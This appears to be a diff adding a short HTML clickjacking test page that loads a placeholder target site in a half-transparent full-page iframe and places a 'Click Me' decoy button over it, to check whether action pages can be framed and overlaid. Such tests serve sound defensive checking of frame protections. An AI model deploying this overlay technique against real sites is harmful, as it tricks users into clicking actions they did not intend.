@@ -1,0 +1,33 @@
+<!-- #basic clickjacking Test with Overlay (HTML) -->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced Clickjacking Test</title>
+    <style>
+        #target-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.5;
+            z-index: 1;
+        }
+        #decoy-button {
+            position: absolute;
+            top: 100px;
+            left: 100px;
+            z-index: 2;
+            background: blue;
+            color: white;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="target-frame" src="https://target-site.com/action-page"></iframe>
+    <button id="decoy-button">Click Me (Safe Decoy)</button>
+    <p>This tests if action elements can be overlayed with deceptive buttons.</p>
+</body>
+</html>
